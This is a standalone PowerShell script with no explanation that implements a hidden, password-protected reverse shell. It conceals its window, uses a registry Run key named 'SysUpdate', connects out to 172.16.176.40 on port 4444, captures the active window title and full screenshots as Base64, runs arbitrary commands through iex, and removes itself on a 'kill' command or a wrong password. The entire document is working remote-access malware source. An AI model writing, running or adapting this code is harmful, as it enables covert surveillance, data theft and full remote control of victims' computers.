$ip = '172.16.176.40'; $port = 4444; $pass = "biskviti" 
$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $name = "SysUpdate"

$api = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru
$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

function Die {
    Remove-ItemProperty -Path $reg -Name $name -Force -ErrorAction SilentlyContinue
    Stop-Process -Id $PID -Force
}

while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient($ip, $port); $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
        
        $s.Write(($e.GetBytes("AUTH REQUIRED: ")), 0, 15)
        [byte[]]$authB = New-Object byte[] 64; $len = $s.Read($authB, 0, $authB.Length)
        if ($len -le 0) { $c.Close(); continue }
        $attempt = $e.GetString($authB, 0, $len).Trim()

        if ($attempt -ne $pass) {
            $s.Write(($e.GetBytes("ACCESS DENIED. SELF-DESTRUCTING...`n")), 0, 36)
            $c.Close(); Die
        }

        $s.Write(($e.GetBytes("ACCESS GRANTED.`nCommands: 'screen' (Active Window), 'screenshot' (Base64), 'kill'`nPS $PWD> ")), 0, 92)

        [byte[]]$b = New-Object byte[] 65535
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $in = $e.GetString($b, 0, $i).Trim(); $out = ""

            if ($in -eq 'kill') { Die }
            
            elseif ($in -eq 'screen') {
                $handle = $api::GetForegroundWindow()
                $sb = New-Object System.Text.StringBuilder 256
                $api::GetWindowText($handle, $sb, $sb.Capacity)
                $out = "[!] Current Window: " + $sb.ToString() + "`n"
            }

            elseif ($in -eq 'screenshot') {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                    $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bmp = New-Object System.Drawing.Bitmap $sc.Width, $sc.Height
                    $g = [System.Drawing.Graphics]::FromImage($bmp)
                    $g.CopyFromScreen($sc.X, $sc.Y, 0, 0, $bmp.Size)
                    
                    $ms = New-Object System.IO.MemoryStream
                    $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
                    $prms = New-Object System.Drawing.Imaging.EncoderParameters(1)
                    $prms.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 60)
                    $bmp.Save($ms, $encoder, $prms)
                    
                    $base64 = [Convert]::ToBase64String($ms.ToArray())
                    $out = "`n---BEGIN SCREENSHOT---`n$base64`n---END---`n"
                    
                    $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
                } catch { $out = "[!] Screenshot Error: $($_.Exception.Message)`n" }
            }
            else {
                $out = try { if ($in) { iex $in 2>&1 | Out-String } } catch { $_.Exception.Message }
            }
            
            $resp = $e.GetBytes($out + "PS $PWD> "); $s.Write($resp, 0, $resp.Length); $s.Flush()
        }
    } catch { Start-Sleep 5 }
}
